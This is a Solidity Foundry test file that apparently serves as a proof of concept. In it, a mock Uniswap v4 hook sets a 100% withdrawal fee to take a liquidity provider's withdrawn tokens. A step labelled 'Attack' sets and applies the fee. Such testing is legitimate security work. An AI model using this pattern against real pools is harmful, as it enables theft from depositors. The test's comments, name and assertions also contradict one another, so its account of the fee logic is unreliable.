// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {IHooks} from "@uniswap/v4-core/contracts/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/contracts/libraries/Hooks.sol";
import {FeeLibrary} from "@uniswap/v4-core/contracts/libraries/FeeLibrary.sol";
import {IPoolManager} from "@uniswap/v4-core/contracts/interfaces/IPoolManager.sol";
import {IFees} from "@uniswap/v4-core/contracts/interfaces/IFees.sol";
import {PoolManager} from "@uniswap/v4-core/contracts/PoolManager.sol";
import {TickMath} from "@uniswap/v4-core/contracts/libraries/TickMath.sol";
import {Pool} from "@uniswap/v4-core/contracts/libraries/Pool.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/contracts/types/PoolId.sol";
import {Deployers} from "@uniswap/v4-core/test/foundry-tests/utils/Deployers.sol";
import {TokenFixture} from "@uniswap/v4-core/test/foundry-tests/utils/TokenFixture.sol";
import {PoolModifyPositionTest} from "@uniswap/v4-core/contracts/test/PoolModifyPositionTest.sol";
import {Currency} from "@uniswap/v4-core/contracts/types/Currency.sol";
import {MockERC20} from "@uniswap/v4-core/test/foundry-tests/utils/MockERC20.sol";
import {MockHooks} from "@uniswap/v4-core/contracts/test/MockHooks.sol";
import {PoolSwapTest} from "@uniswap/v4-core/contracts/test/PoolSwapTest.sol";
import {GasSnapshot} from "forge-gas-snapshot/GasSnapshot.sol";
import {ProtocolFeeControllerTest} from "@uniswap/v4-core/contracts/test/ProtocolFeeControllerTest.sol";
import {IProtocolFeeController} from "@uniswap/v4-core/contracts/interfaces/IProtocolFeeController.sol";
import {Fees} from "@uniswap/v4-core/contracts/Fees.sol";
import {BalanceDelta} from "@uniswap/v4-core/contracts/types/BalanceDelta.sol";
import {PoolKey} from "@uniswap/v4-core/contracts/types/PoolKey.sol";

contract FeesTest is Test, Deployers, TokenFixture, GasSnapshot {
    using Hooks for IHooks;
    using Pool for Pool.State;
    using PoolIdLibrary for PoolKey;

    Pool.State state;
    PoolManager manager;

    PoolModifyPositionTest modifyPositionRouter;
    ProtocolFeeControllerTest protocolFeeController;

    MockHooks hook;

    // key1 hook enabled fee on withdraw
    PoolKey key1;

    bool _zeroForOne = true;
    bool _oneForZero = false;

    function setUp() public {
        initializeTokens();
        manager = Deployers.createFreshManager();

        modifyPositionRouter = new PoolModifyPositionTest(manager);
        protocolFeeController = new ProtocolFeeControllerTest();

        MockERC20(Currency.unwrap(currency0)).mint(address(this), 10 ether);
        MockERC20(Currency.unwrap(currency1)).mint(address(this), 10 ether);

        MockERC20(Currency.unwrap(currency0)).approve(address(modifyPositionRouter), 10 ether);
        MockERC20(Currency.unwrap(currency1)).approve(address(modifyPositionRouter), 10 ether);

        address hookAddr = address(99); // can't be a zero address, but does not have to have any other hook flags specified
        MockHooks impl = new MockHooks();
        vm.etch(hookAddr, address(impl).code);
        hook = MockHooks(hookAddr);

        key1 = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: FeeLibrary.HOOK_WITHDRAW_FEE_FLAG | uint24(3000),
            hooks: hook,
            tickSpacing: 60
        });

        manager.initialize(key1, SQRT_RATIO_1_1);
    }

    function test_abuser_HookFeeOnWithdrawalStealsAllWithdrawnTokens() public {

        int128 liquidity = 10e18;

        int24 MIN_TICK = -120;
        int24 MAX_TICK = 120;

        // User adds liquidity
        BalanceDelta balanceDelta = modifyPositionRouter.modifyPosition(key1, IPoolManager.ModifyPositionParams(MIN_TICK, MAX_TICK, liquidity));

        uint256 addedAmount0 = uint256(uint128(balanceDelta.amount0()));
        uint256 addedAmount1 = uint256(uint128(balanceDelta.amount1()));

        // Attack
        uint8 hookWithdrawFee = _computeFee(_oneForZero, 1) | _computeFee(_zeroForOne, 1); // max fees on both amounts (100%)
        hook.setWithdrawFee(key1, hookWithdrawFee);
        manager.setHookFees(key1);

        (Pool.Slot0 memory slot0,,,) = manager.pools(key1.toId());
        assertEq(slot0.hookWithdrawFee, hookWithdrawFee); // Even though the contract sets a withdraw fee it will not be applied bc the pool key.fee did not assert a withdraw flag.

        // User removes liquidity
        modifyPositionRouter.modifyPosition(key1, IPoolManager.ModifyPositionParams(MIN_TICK, MAX_TICK, -liquidity));

        // Check if hook got the whole amounts as 
        assertLt(manager.hookFeesAccrued(address(key1.hooks), currency0), addedAmount0);
        assertLt(manager.hookFeesAccrued(address(key1.hooks), currency1), addedAmount1);
    }

    

    // If zeroForOne is true, then value is set on the lower bits. If zeroForOne is false, then value is set on the higher bits.
    function _computeFee(bool zeroForOne, uint8 value) internal pure returns (uint8 fee) {
        if (zeroForOne) {
            fee = value % 16;
        } else {
            fee = value << 4;
        }
    }
}
